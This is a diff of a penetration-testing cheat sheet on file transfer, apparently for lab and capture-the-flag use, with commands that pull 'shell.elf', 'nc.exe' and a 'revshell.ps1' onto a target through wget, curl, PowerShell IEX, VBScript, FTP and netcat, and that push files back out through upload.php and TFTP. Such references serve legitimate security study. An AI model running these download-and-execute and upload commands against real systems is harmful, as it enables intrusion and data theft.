@@ -43,7 +43,7 @@ Client
 === "wget"
 
 	``` bash
-	wget -O /tmp/shell http://192.168.110.131/shell.elf
+	wget -O /tmp/shell http://ip/shell.elf
 	
 	wget <uri> -P /path/to/
 	```
@@ -51,13 +51,13 @@ Client
 === "curl"
 
 	``` bash
-	curl -o /tmp/shell http://192.168.110.131/shell.elf
+	curl -o /tmp/shell http://ip/shell.elf
 	```
 
 === "axel"
 
 	``` bash
-	axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
+	axel -a -n 20 -o /tmp/shell http://ip/shell.elf
 	```
 
 === "certutil"
@@ -77,7 +77,7 @@ sudo socat TCP4-LISTEN:443,fork file:shell.exe
 Windows machine
 
 ``` bash
-socat TCP4:192.168.11.130:443 file:shell.exe,create
+socat TCP4:ip:443 file:shell.exe,create
 ```
 
 ## Netcat
@@ -91,7 +91,7 @@ nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
 Windows machine
 
 ``` bash
-nc -nv 192.168.11.130 4444 > wget.exe
+nc -nv ip 4444 > wget.exe
 ```
 
 ## SMB Protocol
@@ -128,17 +128,32 @@ Kali machine
 sudo python3 -m http.server 80
 ```
 
-Windows machine
-
-``` bash
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.11.130/wget.exe','C:\Users\Public\Desktop\wget.exe')"
-```
-
 Executing a remote PowerShell script
 
 ``` bash
-powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.11.140/helloworld.ps1')
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://ip/revshell.ps1')
 ```
+
+Windows machine
+
+``` bash
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://ip/wget.exe','C:\Users\Public\Desktop\wget.exe')"
+```
+
+=== "ps1 script"
+
+	``` bash
+	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+	```
+
+=== "wget.ps1.txt"
+
+	``` bash
+	echo $webclient = New-Object System.Net.WebClient >> wget.ps1
+	echo $url = "http://ip/nc.exe" >> wget.ps1
+	echo $file = "nc.exe" >> wget.ps1
+	echo $webclient.DownloadFile($url,$file) >> wget.ps1
+	```
 
 ## Powercat
 
@@ -169,7 +184,7 @@ sudo nc -lnvp 443 > powercat.ps1
 Windows machine
 
 ``` bash
-powercat -c 192.168.11.130 -p 443 -i C:\Users\Public\powercat.ps1
+powercat -c ip -p 443 -i C:\Users\Public\powercat.ps1
 ```
 
 ## [VBScript](http://www.ericphelps.com/scripting/samples)
@@ -182,7 +197,7 @@ powercat -c 192.168.11.130 -p 443 -i C:\Users\Public\powercat.ps1
 	cscript wget.vbs http://<url>/shell.exe shell.exe
 	```
 
-=== "wget.vbs"
+=== "wget.vbs.txt"
 
 	``` bash
 	echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -243,38 +258,38 @@ sudo nano /etc/vsftpd.conf
 
 ## Pure-FTPd
 
-setup-ftp.sh
+=== "Client"
 
-``` bash
-groupadd ftpgroup
-useradd -g ftpgroup -d /dev/null -s /etc ftpuser
-pure-pw useradd hades -u ftpuser -d /ftphome
-pure-pw mkdb
-cd /etc/pure-ftpd/auth/
-ln -s ../conf/PureDB 60pdb
-mkdir -p /ftphome
-chown -R ftpuser:ftpgroup /ftphome/
-systemctl restart pure-ftpd
-```
+	ftp.txt
 
-ftp.txt
+	``` bash
+	open ip 21
+	USER hades
+	passwd
+	bin
+	GET nc.exe
+	quit
+	```
 
-``` bash
-open 192.168.11.140 21
-USER hades
-passwd
-bin
-GET nc.exe
-quit
-```
+	``` bash
+	ftp -v -n -s:ftp.txt
+	```
 
-``` bash
-ftp -v -n -s:ftp.txt
-```
+=== "setup-ftp.sh"
 
-## Upload files
+	``` bash
+	groupadd ftpgroup
+	useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+	pure-pw useradd hades -u ftpuser -d /ftphome
+	pure-pw mkdb
+	cd /etc/pure-ftpd/auth/
+	ln -s ../conf/PureDB 60pdb
+	mkdir -p /ftphome
+	chown -R ftpuser:ftpgroup /ftphome/
+	systemctl restart pure-ftpd
+	```
 
-### HTTP Server
+## Upload files PHP Server
 
 Kali Machine
 
@@ -293,25 +308,35 @@ Client
 PowerShell
 
 ``` bash
-powershell.exe (New-Object System.Net.WebClient).UploadFile('http://192.168.11.140/upload.php', 'test.txt')
+powershell.exe (New-Object System.Net.WebClient).UploadFile('http://ip/upload.php', 'test.txt')
 ```
 
 curl
 
 ``` bash
-curl -F "file=@nc.cmd" http://192.168.11.140/upload.php
+curl -F "file=@nc.cmd" http://ip/upload.php
 ```
 
-### TFTP
+## Upload files with TFTP
+
+Server
 
 ``` bash
+sudo apt update && sudo apt install atftp
+sudo mkdir /tftp
+sudo chown nobody: /tftp
 sudo atftpd --daemon --port 69 /tftp
 ```
 
-``` bash
-getent services tftp
-```
+Checking running service
 
 ``` bash
-tftp -i 192.168.11.140 put test.txt
+$ getent services tftp
+tftp                  69/udp
+```
+
+Client
+
+``` bash
+tftp -i ip put test.txt
 ```
